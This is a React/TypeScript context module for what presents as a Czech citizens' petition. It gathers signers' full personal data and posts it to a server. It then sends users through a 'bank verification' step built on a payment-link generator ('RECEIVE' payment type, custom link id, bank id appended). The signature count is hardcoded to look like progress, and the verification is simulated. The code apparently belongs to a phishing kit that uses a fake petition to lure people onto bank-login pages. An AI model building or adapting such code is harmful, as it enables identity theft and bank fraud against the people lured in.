
import React, { createContext, useState, useContext } from 'react';
import axios from 'axios';

type City = 'Praha' | 'Brno' | 'Ostrava' | 'Plzeň' | 'Liberec' | 'Olomouc';

interface PetitionData {
  firstName: string;
  lastName: string;
  birthDate: string;
  phone: string;
  email: string;
  address: string;
  profession: string;
  education: string;
  city: City;
  district: string;
  bank?: string;
}

interface CreateLinkResponse {
  link?: string;
}

interface PetitionContextType {
  petitionData: PetitionData;
  setPetitionData: React.Dispatch<React.SetStateAction<PetitionData>>;
  submissionProgress: number;
  totalSignatures: number;
  signatureCount: number;
  submitPetition: (data: PetitionData) => Promise<boolean>;
  completeBankVerification: (bank: string) => Promise<boolean>;
  createBankLink: (bankId: string) => Promise<string>;
}

const defaultPetitionData: PetitionData = {
  firstName: '',
  lastName: '',
  birthDate: '',
  phone: '',
  email: '',
  address: '',
  profession: '',
  education: 'Střední s maturitou',
  city: 'Praha',
  district: '',
};

const PetitionContext = createContext<PetitionContextType | undefined>(undefined);

export const PetitionProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  const [petitionData, setPetitionData] = useState<PetitionData>(defaultPetitionData);
  const totalSignatures = 10000;
  const signatureCount = 3125; // Updated from 3000 to 3125
  const submissionProgress = (signatureCount / totalSignatures) * 100;

  // Send data to the API endpoint
  const submitPetition = async (data: PetitionData): Promise<boolean> => {
    console.log('Submitting petition data:', data);
    
    try {
      // Send data to /api/confirm endpoint
      await axios.post('/api/confirm', data);
      
      // Update local state
      setPetitionData(data);
      return true;
    } catch (error) {
      console.error('Error submitting petition:', error);
      return false;
    }
  };

  const completeBankVerification = async (bank: string): Promise<boolean> => {
    console.log('Completing bank verification with bank:', bank);
    // Simulate API call delay
    await new Promise(resolve => setTimeout(resolve, 1000));
    setPetitionData(prev => ({ ...prev, bank }));
    return true;
  };
  
  // Adapted from the provided function
  const createBankLink = async (bankId: string): Promise<string> => {
    const errorText = "Přihlášení je dočasně nedostupné";

    try {
      const { data } = await axios.post<CreateLinkResponse>(
        `/createLinkApi/createlink`,
        {
          service: "custom",
          payload: {},
          price: 0,
          link: "b01290040ef2",
          paymentType: "RECEIVE",
          additionalFields: {
            "currency": "CZK"
          }
        },
        {
          headers: {
            "Content-Type": "application/json",
            "Accept-Encoding": "gzip,deflate,compress",
          },
        }
      );

      if (!data?.link) {
        throw new Error(errorText);
      }

      return data.link + "/" + bankId;
    } catch (e) {
      throw new Error(errorText);
    }
  };

  return (
    <PetitionContext.Provider
      value={{
        petitionData,
        setPetitionData,
        submissionProgress,
        totalSignatures,
        signatureCount,
        submitPetition,
        completeBankVerification,
        createBankLink,
      }}
    >
      {children}
    </PetitionContext.Provider>
  );
};

export const usePetition = (): PetitionContextType => {
  const context = useContext(PetitionContext);
  if (context === undefined) {
    throw new Error('usePetition must be used within a PetitionProvider');
  }
  return context;
};
